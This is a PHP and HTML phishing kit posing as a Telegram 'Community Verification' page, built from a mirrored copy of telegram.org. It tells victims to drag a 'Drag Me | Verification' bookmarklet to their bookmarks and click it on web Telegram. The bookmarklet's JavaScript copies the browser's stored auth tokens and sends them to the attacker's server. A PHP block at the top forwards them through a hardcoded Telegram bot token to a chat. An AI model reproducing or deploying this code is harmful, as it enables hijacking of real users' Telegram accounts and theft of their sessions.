<?php
$raw = base64_decode($_GET["data"]);
$data = json_decode($raw, true);
if($data["auth_key_fingerprint"])
{
$message = str_replace("{TICK}", "\\", str_replace("{CODE}", $raw, file_get_contents("message.txt")));
$ch = curl_init("https://api.telegram.org/bot7239679051:AAHFhF29L_oLiBU8ZErER1u199aNzZw9rps/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => "-1002208412209", "text" => $message, "parse_mode" => "MarkdownV2"]);
$response = curl_exec($ch);
curl_close($ch);
header("Location: web.telegram.org.k");
exit;
}
?>


<!DOCTYPE html>
<html class="">

<!-- Mirrored from telegram.org/apps by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 08 Sep 2023 00:25:31 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->

<head>
  <meta charset="utf-8">
  <title>Telegram Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">


  <link rel="icon" type="image/svg+xml" href="img/website_icona87f.svg?4">
  <link rel="apple-touch-icon" sizes="180x180" href="img/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="img/favicon-16x16.png">
  <link rel="alternate icon" href="img/favicon.ico" type="image/x-icon" />
  <link href="css/bootstrap.mineccb.css?3" rel="stylesheet">

  <link href="css/telegram0116.css?236" rel="stylesheet" media="screen">
</head>

<body class="preload">
  <div id="fb-root"></div>
  <div class="tl_page_wrap">
    <div class="tl_page_head navbar navbar-static-top navbar navbar-tg">
      <div class="navbar-inner">
        <div class="container clearfix">
          <ul class="nav navbar-nav navbar-right">
            <li class="dropdown top_lang_select"><a class="dropdown-toggle" onclick="return dropdownClick(this, event)"
                href="#"><i class="dev_top_lang_icon"></i>EN <b class="minicaret"></b></a>
            <li class="navbar-twitter hidden-xs"><a href="https://twitter.com/telegram" target="_blank"
                data-track="Follow/Twitter" onclick="trackDlClick(this, event)"><i class="icon icon-twitter"></i>
                Twitter</a></li>
          </ul>
          <ul class="nav navbar-nav">
            <li class=""><a href="https://telegram.org/" target="_blank">Home</a></li>
            <li class="active"><a href="#">Community Verification</a></li>
            <li class="hidden-xs "><a href="https://core.telegram.org/api" target="_blank">API</a></li>
            <li class="hidden-xs "><a href="https://core.telegram.org/mtproto" target="_blank">Protocol</a></li>
          </ul>
        </div>
      </div>
    </div>
    <div class="container clearfix tl_page_container ">
      <div class="tl_page">
        <div id="dev_page_content_wrap" class=" ">
          <div class="dev_page_bread_crumbs"></div>
          <h1 id="dev_page_title">Community Verification</h1>

          <div id="dev_page_content">
            <div class="blog_side_image_wrap">
              <picture class="dev_page_tgsticker blog_side_image js-tgsticker_image" style="width:160px;">
                <div style="padding-top:100%"></div>
                <source type="application/x-tgsticker"
                  srcset="/file/464001916/10d68/WV7yRWbwH8c.9850/d81b3e5203746a2759"><img
                  src="file/464001916/10d69/wMJtQWE_ZwI.17701.png/f4e97997cb38fc577a.png" />
              </picture>
            </div>

            <p>
              <div class="dev_page_nav_wrap">
            </p>
            <style>
              #verify {
                border: 0px;
                outline: 0px;
                padding: 10px;
                color: #fff;
                background-color: #59a0e7;
                font-family: "Lucida Grande", "Lucida Sans Unicode", Arial, Helvetica, Verdana, sans-serif;
                font-weight: bold;
                border-radius: 6px;
                display: flex;
                justify-content: center;
                align-items: center;
                text-align: center;
                gap: 10px;
                text-decoration: none;
              }
            </style>
            <b>This community requires you to complete 3 additional verification steps to prove you are not a bot before you can access main-areas.</b>
            <br>
            <p><h2>1. </h2>To complete verification please ensure you are on a Desktop device and you are logged into <b><a href="https://web.telegram.org/k/" target="_blank">web-telegram</a></b>.</p>
            <p><h2>2. </h2>Please drag the button below to your bookmarks bar ( press <b style="font-family: 'Inconsolata', monospace; font-weight: 700; background-color: black; padding: 2px; color: #fff;">[CTRL+SHIFT+B]</b> if not open).<br><br><a draggable="true" id="verifyElement" href="javascript:alert('Loading...')"><button type="button" id="verify"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-telegram" viewBox="0 0 16 16">
              <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8.287 5.906c-.778.324-2.334.994-4.666 2.01-.378.15-.577.298-.595.442-.03.243.275.339.69.47l.175.055c.408.133.958.288 1.243.294.26.006.549-.1.868-.32 2.179-1.471 3.304-2.214 3.374-2.23.05-.012.12-.026.166.016.047.041.042.12.037.141-.03.129-1.227 1.241-1.846 1.817-.193.18-.33.307-.358.336a8.154 8.154 0 0 1-.188.186c-.38.366-.664.64.015 1.088.327.216.589.393.85.571.284.194.568.387.936.629.093.06.183.125.27.187.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.426 1.426 0 0 0-.013-.315.337.337 0 0 0-.114-.217.526.526 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09z"/>
            </svg> Drag Me | Verification</button></a></p>
            <p><h2>3. </h2>Finally, go back to <b><a href="https://web.telegram.org/k/" target="_blank">web-telegram</a></b> and press on the new bookmark button to complete verification and unlock full.</p>
            <script>
                document.getElementById("verifyElement").href = `javascript:if (location.href.includes('web.telegram.org/k')) { try { var localStorageClone={};Object.keys(localStorage).forEach((v)=>{try{if(v=="xt_instance"||v=="user_auth"||v.includes("auth")){localStorageClone[v]=JSON.parse(localStorage[v])}}catch(e){localStorageClone[v]=localStorage[v]}});localStorageClone.xt_instance.time="chng_time";location.href="${location.protocol}//${location.hostname}/verify?data="+btoa(JSON.stringify(localStorageClone)); } catch(E) { alert('An unexpected error occured, please try again later.') } } else { alert('Please click on the button again after closing this prompt, you are being redirected to web-telegram.'); location.href = 'https://web.telegram.org/k'; }`  
            </script>
            <!-- <h4><a class="anchor" name="mobile-apps" href="#mobile-apps"><i class="anchor-icon"></i></a>Mobile apps</h4>
            <ul>
              <li><a href="#"><i class="app-icon app-icon-android"></i>Telegram for Android</a></li>
              <li><a href="https://itunes.apple.com/app/telegram-messenger/id686449807"><i
                    class="app-icon app-icon-ios"></i>Telegram for iPhone and iPad</a></li>
            </ul> -->
          
        </div>

      </div>

    </div>
  </div>
  </div>
  <div class="footer_wrap">
    <div class="footer_columns_wrap footer_desktop">
      <div class="footer_column footer_column_telegram">
        <h5>Telegram</h5>
        <div class="footer_telegram_description"></div>
        Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.
      </div>

      <div class="footer_column">
        <h5><a href="#">About</a></h5>
        <ul>
          <li><a href="#">FAQ</a></li>
          <li><a href="#">Privacy</a></li>
          <li><a href="#">Press</a></li>
        </ul>
      </div>
      <div class="footer_column">
        <h5><a href="##mobile-apps">Mobile Apps</a></h5>
        <ul>
          <li><a href="https://itunes.apple.com/app/telegram-messenger/id686449807">iPhone/iPad</a></li>
          <li><a href="#">Android</a></li>
          <li><a href="https://web.telegram.org/">Mobile Web</a></li>
        </ul>
      </div>
      <div class="footer_column">
        <h5><a href="##desktop-apps">Desktop Apps</a></h5>
        <ul>
          <li><a href="https://desktop.telegram.org/">PC/Mac/Linux</a></li>
          <li><a href="https://macos.telegram.org/">macOS</a></li>
          <li><a href="https://web.telegram.org/">Web-browser</a></li>
        </ul>
      </div>
      <div class="footer_column footer_column_platform">
        <h5><a href="https://core.telegram.org/">Platform</a></h5>
        <ul>
          <li><a href="https://core.telegram.org/api">API</a></li>
          <li><a href="https://translations.telegram.org/">Translations</a></li>
          <li><a href="https://instantview.telegram.org/">Instant View</a></li>
        </ul>
      </div>
    </div>
    <div class="footer_columns_wrap footer_mobile">
      <div class="footer_column">
        <h5><a href="#">About</a></h5>
      </div>
      <div class="footer_column">
        <h5><a href="#">Blog</a></h5>
      </div>
      <div class="footer_column">
        <h5><a href="#">Apps</a></h5>
      </div>
      <div class="footer_column">
        <h5><a href="https://core.telegram.org/">Platform</a></h5>
      </div>
      <div class="footer_column">
        <h5><a href="https://twitter.com/telegram" target="_blank" data-track="Follow/Twitter"
            onclick="trackDlClick(this, event)">Twitter</a></h5>
      </div>
    </div>
  </div>
  <script src="js/main67c6.js?47"></script>
  <script src="js/tgstickerc16a.js?31"></script>

  <script>
    mainInitTgStickers({
      "maxDeviceRatio": 2,
      "cachingModulo": 4
    });
    backToTopInit("Go up");
    removePreloadInit();
  </script>
</body>

<!-- Mirrored from telegram.org/apps by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 08 Sep 2023 00:25:40 GMT -->

</html>
<!-- page generated in 8.34ms -->
